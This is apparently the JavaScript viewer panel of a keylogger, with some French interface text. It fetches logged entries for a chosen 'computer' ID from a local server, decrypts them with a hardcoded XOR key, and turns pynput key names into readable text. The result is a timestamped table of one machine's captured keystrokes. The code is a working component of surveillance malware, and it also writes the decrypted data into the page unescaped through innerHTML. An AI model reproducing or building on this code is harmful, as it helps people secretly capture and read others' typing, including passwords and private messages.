function xorEncrypt(data, key) {
    let result = '';
    for (let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

function decrypt(encryptedHex) {
    const key = 'your_secure_secret_key';

    let encryptedData = '';
    for (let i = 0; i < encryptedHex.length; i += 2) {
        encryptedData += String.fromCharCode(parseInt(encryptedHex.substr(i, 2), 16));
    }

    let decryptedData = xorEncrypt(encryptedData, key);

    decryptedData = decryptedData
        .replace(/Key\.space/g, ' ')
        .replace(/Key\.backspace/g, '[backspace]')
        .replace(/Key\.enter/g, '[enter]')
        .replace(/Key\.tab/g, '[tab]')
        .replace(/Key\.shift/g, '[shift]')
        .replace(/Key\.ctrl/g, '[ctrl]')
        .replace(/Key\.alt/g, '[alt]')
        .replace(/Key\.capslock/g, '[capslock]')
        .replace(/Key\.up/g, '[up]')
        .replace(/Key\.down/g, '[down]')
        .replace(/Key\.left/g, '[left]')
        .replace(/Key\.right/g, '[right]');

    return decryptedData;
}


function getComputerFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const computerId = urlParams.get('computer');
    console.log('Computer ID from URL:', computerId);
    return computerId;
}

async function fetchData(computerId) {
    const tableBody = document.getElementById("data-table");
    const errorMessage = document.getElementById("error-message");
    errorMessage.innerText = "";
    tableBody.innerHTML = "<tr><td colspan='2'>📡 Chargement des données...</td></tr>";

    try {
        const response = await fetch(`http://127.0.0.1:5000/download/${computerId}`);
        const data = await response.json();

        console.log("Data received from the server:", data);

        if (data.error) {
            throw new Error(data.error);
        }

        tableBody.innerHTML = "";
        const sortedEntries = Object.entries(data).sort((a, b) => new Date(b[0]) - new Date(a[0]));

        sortedEntries.forEach(([timestamp, entry]) => {
            const encryptedData = entry.key_data;
            if (encryptedData) {
                const decryptedData = decrypt(encryptedData);

                const row = document.createElement("tr");
                row.innerHTML = `
                    <td>${new Date(timestamp).toLocaleString()}</td>
                    <td>${decryptedData}</td>
                `;
                tableBody.appendChild(row);
            }
        });

    } catch (error) {
        errorMessage.innerText = error.message;
        tableBody.innerHTML = "<tr><td colspan='2' style='color: red;'>Erreur lors du chargement des données</td></tr>";
    }
}

const computerId = getComputerFromURL();
console.log('Computer ID on page load:', computerId);

if (computerId) {
    fetchData(computerId);
} else {
    console.error('No computer ID found in the URL.');
}
